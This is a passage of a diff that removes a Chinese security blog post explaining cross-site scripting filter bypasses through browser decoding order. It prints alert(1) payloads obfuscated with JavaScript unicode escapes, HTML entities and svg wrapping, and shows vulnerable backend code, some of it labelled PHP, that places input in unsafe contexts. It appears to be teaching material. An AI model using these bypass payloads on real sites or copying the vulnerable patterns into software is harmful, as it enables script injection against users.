class="string">&quot;%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这个例子就比较特别了，当服务器返回一个如上的代码时，首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;script&gt;</code>标签，于是就先建立了一个DOM节点；由于是<code>&lt;script&gt;</code>标签，所以这里并不会第一时间进行HTML解码，而是先进行JS解码，JS解码之后若有必要才进行HTML解码，（这里没有必要，因为没有检查到完整得HTML标签结构），最后执行语句。</p>
-<p>我们可以对其做以下变形，下列情况都可以成功弹框：</p>
-<ul>
-<li>对<code>alert</code>进行JS编码</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>使用<code>&lt;svg&gt;</code>标签放在<code>&lt;script&gt;</code>标签前面，那么就可以对<code>&lt;script&gt;</code>标签里面的内容进行Html编码，这是因为在解析到<code>&lt;svg&gt;</code>标签时，浏览器就开始使用一套新的标准开始解析后面的内容，直到碰到闭合标签<code>&lt;/svg&gt;</code>。而在这一套新的标准遵循XML解析规则，在XML中实体编码会自动转义，重新来一遍标签开启状态，此时就会执行xss了。（当然了如果你要使用GET方法传参的话最后还要加上URL编码）</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>混合编码，先进行JS编码，再利用<code>&lt;svg&gt;</code>标签进行HTML编码</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 源代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">3. 利用 svg 标签进行HTML编码</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="XSS编码绕过原理"><a href="#XSS编码绕过原理" class="headerlink" title="XSS编码绕过原理"></a>XSS编码绕过原理</h2><p>看完上面的实践内容，估计都清楚浏览器解析代码的过程了吧，这里看2个XSS编码绕过的案例。</p>
-<h3 id="利用HTML编码绕过"><a href="#利用HTML编码绕过" class="headerlink" title="利用HTML编码绕过"></a>利用HTML编码绕过</h3><ul>
-<li>服务器后端关键代码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>)</span>&#123;</span><br><span class="line">    input = input.toUpperCase()</span><br><span class="line">    <span class="keyword">return</span> `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里后端把输入的参数进行了大写处理，由于JavaScript代码对大小写敏感，也就是说<code>ALERT()</code>是不能触发弹窗的，这里就是利用HTML对大小也不敏感，所以HTML编码绕过</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>浏览器解析过程：首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;img&gt;</code>标签语法，于是就先建立了一个DOM节点；然后去<code>onerror</code>事件的值进行HTML解码；接着交给JS解析器进行JS解码，最后执行语句。</p>
-<h3 id="利用JS编码绕过"><a href="#利用JS编码绕过" class="headerlink" title="利用JS编码绕过"></a>利用JS编码绕过</h3><ul>
-<li>服务器后端关键代码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$html</span> = <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;Your name is:</span></span><br><span class="line"><span class="string">		 &lt;div id=&#x27;a&#x27;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">		 &lt;script&gt;</span></span><br><span class="line"><span class="string">		 	document.getElementById(&#x27;a&#x27;).innerHTML=&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.htmlspecialchars(<span class="variable">$value</span>).<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		 &lt;/script&gt;</span></span><br><span class="line"><span class="string">		 &quot;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;</span><br></pre></td></tr></table></figure>
-<p>这里后端使用了<code>htmlspecialchars()</code>函数对输入的参数进行了HTML实体编码，目的是想让我们输入的标签变成普通的文本字符串，一般情况下是无法绕过的，但是这里后端把参数放在了<code>&lt;script&gt;</code>标签里面，并且操作DOM修改了外部的DOM节点，这就让我们有了可乘之机。可以使用JS编码进行绕过</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span> #源码</span><br><span class="line"></span><br><span class="line">\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003e		#JS编码后</span><br></pre></td></tr></table></figure>
-<p>这里浏览器接收到的数据是</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003e<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>浏览器解析过程：首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;script&gt;</code>标签语法，于是就先建立了一个DOM节点；由于是<code>&lt;script&gt;</code>标签，所以会先进行JS解码，解码之后就还原出了原来的<code>&lt;img&gt;</code>标签，浏览器发现是完整机构的HTML标签，于是就再创建DOM节点，然后对<code>onerror</code>事件的值进行HTML解码，最后执行<code>onerror</code>里面的JavaScript语句。</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://www.cnblogs.com/flycat-2016/p/6507543.html" >XSS编码与绕过<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://saucer-man.com/information_security/103.html" >探索XSS利用编码绕过的原理<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://0verwatch.top/xss-encodeorder.html" >xss编码绕过原理以及从中学习到的几个例子<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
